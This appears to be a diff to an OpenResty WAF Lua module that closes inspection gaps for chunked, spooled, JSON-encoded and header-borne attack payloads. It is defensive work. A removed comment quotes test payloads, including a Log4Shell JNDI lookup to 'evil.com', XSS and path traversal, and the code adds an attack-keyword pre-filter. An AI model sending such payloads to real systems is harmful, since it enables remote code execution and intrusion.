@@ -133,6 +133,80 @@ local function log_event(action, layer, attack_type, rule, detail, start_ms, bod
     })
 end
 
+-- ============ 请求体采集 ============
+--
+-- 修复三类实际绕过（均已在真实 OpenResty 复现）：
+--   1. Transfer-Encoding: chunked 没有 Content-Length → 旧逻辑 cl==0 直接跳过；
+--   2. body 大于内存缓冲落临时文件 → get_body_data() 为 nil，旧逻辑从不看
+--      get_body_file()；
+--   3. body > BODY_LIMIT 时旧逻辑整段跳过，而文档承诺的是"抽样检测"。
+-- 现在：只要方法可能有 body 且类型可解析，就读取并把前 BODY_LIMIT 字节送检。
+local NON_BODY_METHODS = {GET = true, HEAD = true, OPTIONS = true, CONNECT = true, TRACE = true}
+
+-- 明确的二进制大对象类型不做语义扫描（读了也不会命中，反而浪费 CPU）；
+-- 其余类型（含空 Content-Type、text/plain、xml、自定义 JSON 类型）都要扫。
+local BINARY_CT_PREFIXES = {
+    "image/", "video/", "audio/", "font/", "application/octet-stream",
+    "application/zip", "application/pdf", "application/x-gzip", "application/gzip",
+}
+
+local function body_may_contain_text(ct)
+    local lc = string.lower(ct or "")
+    if lc == "" then return true end
+    for i = 1, #BINARY_CT_PREFIXES do
+        if lc:find(BINARY_CT_PREFIXES[i], 1, true) then return false end
+    end
+    return true
+end
+
+-- 读 body：优先内存，落临时文件时读前 limit 字节；chunked 也能拿到。
+local function read_body_sample(limit)
+    local ok = pcall(ngx.req.read_body)
+    if not ok then return nil end
+    local data = ngx.req.get_body_data()
+    if data then
+        if #data > limit then return data:sub(1, limit) end
+        return data
+    end
+    local file = ngx.req.get_body_file()
+    if not file then return nil end
+    local f = io.open(file, "rb")
+    if not f then return nil end
+    local sample = f:read(limit) or ""
+    f:close()
+    if sample == "" then return nil end
+    return sample
+end
+
+-- JSON body：先解码再逐字符串检测，避免 {"q":"\u003cscript\u003e"} 这类
+-- 被 JSON 解码后才成型的 payload 漏检。解码失败则回退原文检测。
+local function inspect_json_sample(body, uri)
+    local data = config.json_decode(body)
+    if type(data) ~= "table" then return nil end
+    local nodes = 0
+    local function walk(v, depth)
+        if nodes > 512 or depth > 8 then return nil end
+        nodes = nodes + 1
+        if type(v) == "string" then
+            if #v > 0 and #v <= 16384 then
+                return semantic.inspect(v, uri)
+            end
+            return nil
+        end
+        if type(v) ~= "table" then return nil end
+        for k, item in pairs(v) do
+            if type(k) == "string" and #k <= 256 then
+                local hk = semantic.inspect(k, uri)
+                if hk then return hk end
+            end
+            local h = walk(item, depth + 1)
+            if h then return h end
+        end
+        return nil
+    end
+    return walk(data, 1)
+end
+
 local function detect_request(start_ms)
     -- URI 检测（含规范化后的路径穿越检测）
     local uri = ngx.var.request_uri or ""
@@ -147,7 +221,8 @@ local function detect_request(start_ms)
             local vals = type(vs) == "table" and vs or {vs}
             for _, v in ipairs(vals) do
                 if type(v) == "string" then
-                    local h = semantic.inspect(v, uri)
+                    -- 带上参数名：SSRF 只有 URL 类参数才做内网段判定（见 semantic.lua）
+                    local h = semantic.inspect(v, uri, {param = k})
                     if h then
                         return h.type, k .. "=" .. v
                     end
@@ -155,23 +230,25 @@ local function detect_request(start_ms)
             end
         end
     end
-    -- 请求体（仅 application/x-www-form-urlencoded / json，且不超过阈值）
-    --
-    -- 命中的请求体要作为第三个返回值交给日志：只有 URI/参数命中时日志里的
-    -- requestBody 天然为空，但 POST 命中时它是唯一的取证材料。之前 body 只是
-    -- 局部变量，日志恒为空，展开详情永远看不到请求内容。
-    local ct = ngx.var.content_type or ""
-    local cl = tonumber(ngx.var.content_length) or 0
-    if cl > 0 and cl <= config.BODY_LIMIT and (ct:find("urlencoded", 1, true) or ct:find("json", 1, true) or ct:find("multipart", 1, true)) then
-        ngx.req.read_body()
-        local body = ngx.req.get_body_data()
-        if body then
-            if ct:find("multipart", 1, true) and semantic.detect_upload(body) then
-                return "upload", "dangerous file upload", body
-            end
-            local h = semantic.inspect(body, uri)
-            if h then
-                return h.type, h.value, body
+    -- 请求体：不再依赖 Content-Length（chunked 无 CL），也不再因落盘/超阈值整段跳过。
+    local method = ngx.req.get_method()
+    if not NON_BODY_METHODS[method] then
+        local ct = ngx.var.content_type or ""
+        if body_may_contain_text(ct) then
+            local body = read_body_sample(config.BODY_LIMIT)
+            if body then
+                local lc = string.lower(ct)
+                if lc:find("multipart", 1, true) and semantic.detect_upload(body) then
+                    return "upload", "dangerous file upload", body
+                end
+                local h
+                if lc:find("json", 1, true) then
+                    h = inspect_json_sample(body, uri)
+                end
+                h = h or semantic.inspect(body, uri)
+                if h then
+                    return h.type, h.value, body
+                end
             end
         end
     end
@@ -180,32 +257,37 @@ end
 
 -- ============ 请求头语义检测 ============
 --
--- 背景：语义引擎此前只扫 URI / query args / body，**请求头完全不在检测范围内**。
--- waf-detector 的 va2 行为分析报 `header 0% [UNPROTECTED]`，内侧独立复测确认：
--- `X-Injected: <script>alert(1)</script>`、`Referer: .../../../etc/passwd`、
--- `X-Custom: ${jndi:ldap://evil.com}` 全部 200 放行。这条不是误报，是真实缺口。
---
--- 为什么不用 ngx.req.get_headers() 全量遍历：它会为每个请求分配完整头表，
--- 而绝大多数请求头是无害的标准头。改为只挑"用户自定义/可注入"的头，
--- 命中名单里的头名才做语义检测 —— 白名单式采样，零分配常态路径。
---
--- 刻意跳过的头：
---   host / content-length / connection / user-agent / referer 之外的
---   accept-*(协商类，攻击者塞不进可执行语义)、cache-control 等
---   Host  由 server_name 匹配，不做语义检测（它不是注入载体）
---   Referer 单独处理：路径型穿越要查，query 型注入交给通用语义即可
-local INSPECTABLE_HEADERS = {
-    "x_forwarded_for", "x_forwarded_host", "x_forwarded_proto", "x_forwarded_port",
-    "x_real_ip", "x_originating_ip", "x_client_ip", "x_custom",
-    "x_http_method_override", "x_method_override", "x_http_host",
-    "x_attack", "x_payload", "x_injected", "x_input", "x_test",
-    "x_api_key", "x_token", "x_auth_token",
-    "accept_language", "referer",
+-- 旧实现只检查 23 个固定头名 + get_headers(100)，直接造成两类绕过：
+--   · Cookie / User-Agent / 任意 X-Foo 里的 Log4Shell、XSS、SQLi 不检测；
+--   · 第 101 个之后的请求头不检测。
+-- 现在：get_headers(0) 取全部头；跳过结构性/传输头；每个值先做便宜的字节预筛，
+-- 只有可能携带攻击语法时才调用语义引擎，避免给所有正常请求增加成本。
+local SKIP_HEADERS = {
+    host = true, content_length = true, connection = true, content_type = true,
+    transfer_encoding = true, accept_encoding = true, keep_alive = true,
+    proxy_connection = true, upgrade = true, te = true,
 }
+local HEADER_VALUE_LIMIT = 8192
 
 -- 归一化头名：X-Forwarded-For -> x_forwarded_for
 local function norm_header(k)
     return (string.lower(string.gsub(k, "%-", "_")))
+end
+
+-- 便宜的字节预筛：大多数正常头值不含攻击语法，直接跳过语义引擎。
+local function header_needs_scan(v)
+    if v:find("[<>;'\"`$|\\{}%%]") then return true end
+    if v:find("=", 1, true) then return true end         -- cookie / 参数式头值
+    if v:find("%%") then return true end                 -- 可能是编码后的 payload
+    if v:find("..", 1, true) then return true end         -- 路径穿越
+    if v:find("://", 1, true) then return true end
+    local l = v:lower()
+    if l:find("jndi", 1, true) or l:find("ldap", 1, true) then return true end
+    if l:find("script", 1, true) or l:find("alert", 1, true) then return true end
+    if l:find("select", 1, true) or l:find("union", 1, true) then return true end
+    if l:find("sleep", 1, true) or l:find("waitfor", 1, true) then return true end
+    if l:find("/etc/", 1, true) or l:find("shell", 1, true) then return true end
+    return false
 end
 
 -- 单个头值的语义检测。返回命中类型或 nil。
@@ -218,10 +300,15 @@ local function inspect_header(k, v)
         end
         return nil
     end
-    if type(v) ~= "string" or v == "" or #v > 8192 then
+    if type(v) ~= "string" or v == "" or #v > HEADER_VALUE_LIMIT then
         return nil
     end
-    local ok, res = pcall(semantic.inspect, v, nil)
+    if not header_needs_scan(v) then
+        return nil
+    end
+    -- 头部不是服务端要请求的地址：SSRF 不参与头部判定，
+    -- 否则内网站点访问时浏览器回带的 Referer（http://10.x.x.x:port/）会被当成攻击。
+    local ok, res = pcall(semantic.inspect, v, nil, {header = k})
     if not ok or not res then
         return nil
     end
@@ -229,21 +316,14 @@ local function inspect_header(k, v)
 end
 
 local function inspect_headers()
-    local headers, err = ngx.req.get_headers(100)
-    if not headers then
-        return nil
-    end
-    -- 先按名字过滤，再取值：只有命中可检测名单的头才做字符串处理
+    -- 0 = 不截断。旧实现传 100，第 101 个之后的头完全不检测。
+    local headers = ngx.req.get_headers(0)
+    if not headers then return nil end
     for k, v in pairs(headers) do
         local nk = norm_header(k)
-        for _, want in ipairs(INSPECTABLE_HEADERS) do
-            if nk == want then
-                local hit = inspect_header(k, v)
-                if hit then
-                    return hit
-                end
-                break
-            end
+        if not SKIP_HEADERS[nk] then
+            local hit = inspect_header(k, v)
+            if hit then return hit end
         end
     end
     return nil
